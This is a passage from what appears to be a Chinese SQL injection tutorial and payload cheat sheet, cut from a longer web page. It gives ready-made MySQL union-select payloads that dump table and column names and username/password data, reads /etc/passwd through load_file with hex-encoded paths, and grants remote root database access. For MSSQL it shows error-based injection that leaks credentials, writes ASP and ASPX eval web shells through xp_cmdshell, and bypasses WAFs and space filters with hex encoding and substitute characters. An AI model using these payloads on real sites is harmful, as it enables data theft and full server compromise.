class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... #</span></code></pre></div></div><p><strong>搜索型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">x<span class="hljs-operator">%</span><span class="hljs-string">&#x27; and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... #</span></span></code></pre></div></div><h3 id="查数据库中表名"><a href="#查数据库中表名" class="headerlink" title="查数据库中表名"></a><strong>查数据库中表名</strong></h3><p><strong>数字型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>   and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.tables where table_schema=&#x27;数据库名&#x27;</span></code></pre></div></div><p>数据库名也可以使用十六进制</p><p><strong>字符型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>   and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.tables where table_schema=&#x27;数据库名&#x27; #</span></code></pre></div></div><p>数据库名也可以使用十六进制</p><p><strong>搜索型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">X</span>%&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... from information_schema.tables where table_schema=&#x27;数据库名&#x27; #</span></code></pre></div></div><p>数据库名也可以使用十六进制</p><h3 id="查表中的列名"><a href="#查表中的列名" class="headerlink" title="查表中的列名"></a><strong>查表中的列名</strong></h3><p><strong>数字型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.columns where table_name=&#x27;表名&#x27;</span></code></pre></div></div><p>表名也可以使用十六进制</p><p><strong>字符型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>  and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from information_schema.columns where table_name=&#x27;表名&#x27; #</span></code></pre></div></div><p>表名也可以使用十六进制</p><p><strong>搜索型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">x</span>%&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... from information_schema.columns where table_name=&#x27;表名&#x27; #</span></code></pre></div></div><p>表名也可以使用十六进制</p><h3 id="查表中的数据"><a href="#查表中的数据" class="headerlink" title="查表中的数据"></a><strong>查表中的数据</strong></h3><p><strong>数字型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>   and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from 表名</span></code></pre></div></div><p><strong>字符型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.cn/news.php?p=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">4</span>  and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span> from 表名 #</span></code></pre></div></div><p><strong>搜索型</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">x</span>%&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,.... from 表名 #</span></code></pre></div></div><p>显示版本：<code>select version();</code></p><p>显示字符集：<code>select @@character_set_database;</code></p><p>显示数据库: <code>show databases;</code></p><p>显示表名：<code>show tables;</code></p><p>显示计算机名：<code>select @@hostname;</code></p><p>显示系统版本：<code>select @@version_compile_os;</code></p><p>显示mysql路径：<code>select @@basedir;</code></p><p>显示数据库路径：<code>select @@datadir;</code></p><p>显示root密码：<code>select User,Password from mysql.user;</code></p><p>开启外连：<code>GRANT ALL PRIVILEGES ON . TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION;</code></p><h2 id="MySQL函数利用"><a href="#MySQL函数利用" class="headerlink" title="MySQL函数利用"></a><strong>MySQL函数利用</strong></h2><p>MySQL提供了<code>load_file()</code>函数，可以帮助用户快速读取文件，但是文件位置必须在服务器上，文件路径必须为绝对路径，而且需要root权限</p><p>SQL语句如下：<code>union select 1,load_file(‘/etc/passwd’),3,4,5 #</code></p><p>通常，一些防注入语句不允许单引号的出现，那么可以使用一下语句绕过：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(<span class="hljs-number">0x272F6574632F70617373776427</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> #</span></code></pre></div></div><p>对路径进行16进制转换。</p><h3 id="MSSQL手工注入"><a href="#MSSQL手工注入" class="headerlink" title="MSSQL手工注入"></a><strong>MSSQL手工注入</strong></h3><p>与SQL注入不同的是，SQL利用的爆出显示的字段，MSSQL利用的报错注入，插入恶意的sql语句，让查询报错，在报出的错误中，显示我们想要的信息。</p><p>注入点：</p><p><a href="http://www.xxx.cn/xxx/xxx.aspx?id=1">www.xxx.cn/xxx/xxx.aspx?id=1</a> </p><h4 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a><strong>查询数据库版本</strong></h4><p><code>@@version</code>：MSSQL全局变量，表示数据库版本信息。</p><p><strong>测试语句：</strong></p><p><a href="http://www.xxx.cn/xxx/xxx.aspx?id=1">http://www.xxx.cn/xxx/xxx.aspx?id=1</a>  and @@version&gt;0</p><p>注意：“and @@vsersion&gt;0”也可以写成“and 0/@@version&gt;0”</p><p><strong>报错信息：</strong></p><p>在将 nvarchar 值 ‘Microsoft SQL Server 2008 R2 (SP3) - 10.50.6000.34 (X64) Aug 19 2014 12:21:34 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64 (Build 7601: Service Pack 1) (Hypervisor)‘ 转换成数据类型 int 时失败。</p><p><strong>原因</strong>：</p><p>@@version是MSSQL的全局变量</p><p>如果我们在“?id=1”后面加上“and @@version&gt;0”，那么“and”后面的语句会将“@@version”强制抓换成int类型与0比较大小，但是类型转换失败，所以就将数据库信息暴露出来。</p><h4 id="查询计算机名称"><a href="#查询计算机名称" class="headerlink" title="查询计算机名称"></a><strong>查询计算机名称</strong></h4><p>@@servername：MSSQL全局变量，表示计算机名称。</p><p>报错信息：</p><p>在将 nvarchar 值 ‘WINDOWS-XXXXXX‘ 转换成数据类型 int 时失败。</p><h4 id="查询当前数据库名称"><a href="#查询当前数据库名称" class="headerlink" title="查询当前数据库名称"></a><strong>查询当前数据库名称</strong></h4><p><code>db_name()</code>：当前使用的数据库名称。</p><p>报错信息：</p><p>在将 nvarchar 值 ‘abc‘ 转换成数据类型 int 时失败。</p><h4 id="查询当前连接数据库的用户"><a href="#查询当前连接数据库的用户" class="headerlink" title="查询当前连接数据库的用户"></a><strong>查询当前连接数据库的用户</strong></h4><p><code>User_Name()</code>：当前连接数据库的用户。</p><p>报错信息：</p><p>在将 nvarchar 值 ‘dbo‘ 转换成数据类型 int 时失败。</p><p>注意：如果看到dbo，那么多半当前数据库的用户是dba权限。</p><h4 id="查询其他数据库名称"><a href="#查询其他数据库名称" class="headerlink" title="查询其他数据库名称"></a><strong>查询其他数据库名称</strong></h4><p><strong>爆其他数据库:</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span>  and (SELECT top <span class="hljs-number">1</span> Name FROM Master..SysDatabases)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>报错信息：</p><p>在将 nvarchar 值 ‘master‘ 转换成数据类型 int 时失败。</p><p><strong>再爆其他的数据库则这么写：</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> top <span class="hljs-number">1</span> <span class="hljs-type">Name</span> <span class="hljs-keyword">FROM</span> Master..SysDatabases <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;master&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p><strong>继续的话要这么写：</strong></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> top <span class="hljs-number">1</span> <span class="hljs-type">Name</span> <span class="hljs-keyword">FROM</span> Master..SysDatabases <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;master&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="查询数据库中的表名"><a href="#查询数据库中的表名" class="headerlink" title="查询数据库中的表名"></a><strong>查询数据库中的表名</strong></h4><p>查表名：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> abc.sys.all_objects <span class="hljs-keyword">where</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&#x27;U&#x27;</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span>)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>报错信息：</p><p>在将 nvarchar 值 ‘depart‘ 转换成数据类型 int 时失败。</p><p>再爆其他表：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> abc.sys.all_objects <span class="hljs-keyword">where</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&#x27;U&#x27;</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;depart&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>再继续：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> abc.sys.all_objects <span class="hljs-keyword">where</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&#x27;U&#x27;</span> <span class="hljs-keyword">AND</span> is_ms_shipped=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;depart&#x27;</span>,<span class="hljs-string">&#x27;worker&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="查询表中的列名或者是字段名"><a href="#查询表中的列名或者是字段名" class="headerlink" title="查询表中的列名或者是字段名"></a><strong>查询表中的列名或者是字段名</strong></h4><p>查字段名：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> abc.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;depart&#x27;</span>)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>报错信息：</p><p>在将 nvarchar 值 ‘ID‘ 转换成数据类型 int 时失败。</p><p>再爆其他字段：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> abc.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;depart&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;ID&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>再继续：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">http://www.xxx.cn/xxx/xxx.aspx?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> abc.information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;depart&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-string">&#x27;ID&#x27;</span>,<span class="hljs-string">&#x27;NAME&#x27;</span>))&gt;<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a><strong>爆数据</strong></h4><p>查询数据：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span> and (select top <span class="hljs-number">1</span> password from depart)&gt;<span class="hljs-number">0</span></span></code></pre></div></div><p>报错信息：</p><p>在将 nvarchar 值 ‘B5A1EF8730200F93E50F4F5DEBBCAC0B‘ 转换成数据类型 int 时失败。</p><h4 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a><strong>写入一句话木马</strong></h4><p>如果数据的权限是dba，且知道网站绝对路径的话，那么我们就可以用这个语句来写一句话木马进去：</p><p>asp木马：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span>;exec master..xp_cmdshell <span class="hljs-string">&#x27;echo &quot;&lt;%@ LANGUAGE=VBSCRIPT %&gt;;&lt;%eval request(chr(35))%&gt;&#x27;</span><span class="hljs-string">&#x27;&quot; &gt; d:\KfSite\kaifeng\2.asp&#x27;</span>--</span></code></pre></div></div><p>aspx木马：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">http:<span class="hljs-regexp">//</span>www.xxx.cn<span class="hljs-regexp">/xxx/</span>xxx.aspx?id=<span class="hljs-number">1</span>;exec master..xp_cmdshell <span class="hljs-string">&#x27;echo &quot;&lt;%@ LANGUAGE=Jscript %&gt;;&lt;%eval(Request(&quot;sb&quot;),&quot;unsafe&quot;)%&gt;&#x27;</span><span class="hljs-string">&#x27;&quot; &gt;C:\inetpub\wwwroot\2.aspx&#x27;</span> --</span></code></pre></div></div><p>原理是sql server支持堆叠查询，利用<code>xp_cmdshell</code>可以执行cmd指令，cmd指令中用【echo 内容 &gt; 文件】可以写文件到磁盘里面。</p><h2 id="利用hex编码绕过WAF"><a href="#利用hex编码绕过WAF" class="headerlink" title="利用hex编码绕过WAF"></a><strong>利用hex编码绕过WAF</strong></h2><p><a href="http://www.xxx.com/xxx/xxx.aspx?username=xxx">http://www.xxx.com/xxx/xxx.aspx?username=xxx</a> 利用火狐浏览器中的hackbar工具的Encoding底下的“HEX Encoding”轻松把字符串编码成为可以利用的hex</p><p>然后利用报错注入就可以注入这个网站。</p><h3 id="爆数据库版本"><a href="#爆数据库版本" class="headerlink" title="爆数据库版本"></a><strong>爆数据库版本</strong></h3><p><code>select convert(int,@@version)</code></p><p>hex编码后：0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</p><p>然后使用如下方式注入：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">http</span>://www.xxx.com/xxx/xxx.aspx?username=xxx&#x27;;dEcLaRe @s vArChAr(<span class="hljs-number">8000</span>) sEt @s=<span class="hljs-number">0</span>x<span class="hljs-number">73656</span>c<span class="hljs-number">65637420636</span>f<span class="hljs-number">6</span>e<span class="hljs-number">7665727428696</span>e<span class="hljs-number">742</span>c<span class="hljs-number">404076657273696</span>f<span class="hljs-number">6</span>e<span class="hljs-number">29</span> eXeC(@s)–</span></code></pre></div></div><p>报错信息：</p><p>在将 nvarchar 值 ‘Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft CorporationStandard Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)‘ 转换成数据类型 int 时失败。</p><p>注意后面的注入语句：</p><p>dEcLaRe @s vArChAr(8000) //声明一个局部变量@s，类型为varchar(8000)</p><p>sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 //给@s赋值，为“select convert(int,@@version)”的十六进制编码</p><p>eXeC(@s) //调用函数exec()执行“@s”中的内容。</p><h3 id="爆当前数据库"><a href="#爆当前数据库" class="headerlink" title="爆当前数据库"></a><strong>爆当前数据库</strong></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,db_name())</span></code></pre></div></div><h3 id="爆当前用户"><a href="#爆当前用户" class="headerlink" title="爆当前用户"></a><strong>爆当前用户</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,User_Name())</span></code></pre></div></div><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a><strong>爆表</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> abc[数据库名].sys.all_objects <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span>’U’ <span class="hljs-keyword">AND</span> is_ms_shipped<span class="hljs-operator">=</span><span class="hljs-number">0</span>)) <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> abc[数据库名].sys.all_objects <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span>’U’ <span class="hljs-keyword">AND</span> is_ms_shipped<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (‘CMS_ArticleClass’)))</span></code></pre></div></div><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a><strong>爆字段</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> COLUMN_NAME <span class="hljs-keyword">from</span> abc[数据库名].information_schema.columns <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span>’CMS_Userinfo[表名]’)) <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> COLUMN_NAME <span class="hljs-keyword">from</span> abc[数据库名].information_schema.columns <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span>’CMS_Userinfo[表名]’ <span class="hljs-keyword">and</span> COLUMN_NAME <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (‘id’)))</span></code></pre></div></div><h3 id="爆数据-1"><a href="#爆数据-1" class="headerlink" title="爆数据"></a><strong>爆数据</strong></h3><hr><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> username <span class="hljs-keyword">from</span> CMS_Admin)) <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(<span class="hljs-type">int</span>,(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> password <span class="hljs-keyword">from</span> CMS_Admin))</span></code></pre></div></div><h2 id="SQL注入之你问我答小知识"><a href="#SQL注入之你问我答小知识" class="headerlink" title="SQL注入之你问我答小知识"></a><strong>SQL注入之你问我答小知识</strong></h2><h3 id="id-1，页面如果返回正确页面说明是有注入，那-1可以吗？（www-test-com-xsn-php-id-12-1）"><a href="#id-1，页面如果返回正确页面说明是有注入，那-1可以吗？（www-test-com-xsn-php-id-12-1）" class="headerlink" title="id-1，页面如果返回正确页面说明是有注入，那+1可以吗？（www.test.com/xsn.php?id=12+1）"></a><strong>id-1，页面如果返回正确页面说明是有注入，那+1可以吗？</strong>（<a href="http://www.test.com/xsn.php?id=12+1%EF%BC%89">www.test.com/xsn.php?id=12+1）</a></h3><p>不行，因为加号在url里面是空格的意思。</p><h3 id="你知道mysql里有几种注释方式吗？"><a href="#你知道mysql里有几种注释方式吗？" class="headerlink" title="你知道mysql里有几种注释方式吗？"></a><strong>你知道mysql里有几种注释方式吗？</strong></h3><p>三种：</p><p>①.# 这个注释直到该行结束；</p><p>②./注释多行/；</p><p>③.–+ 这个注释直到该行结束。</p><p>第三种需要解释一下，因为之前我不知道这个方法，说‘–’是注释符我还大概有印象，但是–+就懵。</p><p>其实是– ，注意–的后面有一个空格。但是在url里你直接空格会被浏览器直接处理掉，就到不了数据库里。</p><p>所以特意用加号代替。</p><h3 id="“select-select-from-admin”可以执行吗？-倘若不可以请说明。"><a href="#“select-select-from-admin”可以执行吗？-倘若不可以请说明。" class="headerlink" title="“select select * from admin”可以执行吗？****倘若不可以请说明。"></a><strong>“select select * from admin”可以执行吗？****倘若不可以请说明。</strong></h3><p>不可以执行，在使用select双层的时候要把第二个括起来，否则无效。</p><h3 id="倘若空格过滤了，你知道有哪些可以绕过吗？或者说你知道哪些可以替代空格吗？"><a href="#倘若空格过滤了，你知道有哪些可以绕过吗？或者说你知道哪些可以替代空格吗？" class="headerlink" title="倘若空格过滤了，你知道有哪些可以绕过吗？或者说你知道哪些可以替代空格吗？"></a><strong>倘若空格过滤了，你知道有哪些可以绕过吗？或者说你知道哪些可以替代空格吗？</strong></h3><p>这些是空字符。</p><p>比如un%0aion会被当做union来处理。</p><p>假如空格被过滤了，可能的sql语句就会变成：select from messages where uid=45or1=1</p><p>我们可以使用<code>//</code>来替换空格：<code>http://www.xxx.com/index.php?id=45//or/**/1=1</code></p><p>另外：<code>%09 %0A %0D + /|–|/ /@–|/ /?–|/ /|%20–%20|/</code> 都可以替代空格。</p><h3 id="Windows下的Oracle数据库是什么权限？"><a href="#Windows下的Oracle数据库是什么权限？" class="headerlink" title="Windows下的Oracle数据库是什么权限？"></a><strong>Windows下的Oracle数据库是什么权限？</strong></h3><p>Windows下的Oracle数据库，必须以system权限运行。</p><h3 id="SQL注入和SQL盲注有何差别？"><a href="#SQL注入和SQL盲注有何差别？" class="headerlink" 